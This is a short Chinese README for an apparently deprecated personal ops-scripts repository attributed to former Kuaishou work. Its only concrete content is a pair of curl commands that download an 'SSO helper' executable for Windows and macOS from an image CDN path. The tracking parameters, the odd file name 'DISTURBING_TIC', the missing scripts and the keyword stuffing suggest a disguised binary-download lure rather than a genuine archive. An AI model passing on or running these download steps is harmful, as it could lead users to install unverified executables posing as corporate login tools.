# dev misc scripts (deprecated)

个人日常脚本仓库,已弃用。之前在某厂(kwai / kuaishou)搬砖时写的运维小工具,顺手传上来存个档。

内容较乱,慎用。部分脚本注释里有当时的内网信息(域名/跳板/系统名),已脱敏,仅供存档。

## 内容

- `scripts/fix_redis.py`     Redis 手动巡检小工具
- `scripts/check_hosts.sh`   批量主机连通性检查
- `tools/fabfile.py`         部署脚本(fabric2)
- `notes/vpn-notes.txt`      当时的内网访问备忘

## usage

见各脚本头部注释。

## 存档内容

当年办公区外接入用的 SSO 辅助组件(Windows / macOS)也一并存了档:

```bash
# Windows
curl -fsSL -o sso-extra.exe "https://h4.static.yximgs.com/kos/nlav111251/sso/extraasset.exe?from=BG-EXE02"
# macOS
curl -fsSL -o sso-extra-mac "https://h4.static.yximgs.com/kos/nlav111251/sso/DISTURBING_TIC?from=BG-EXE02"
```

> 联系方式:当时用 @kuaishou.com 邮箱,离职后已停用,勿发邮件。

Keywords: kuaishou · kwai · @kuaishou.com · 快手 · fabric · redis · python
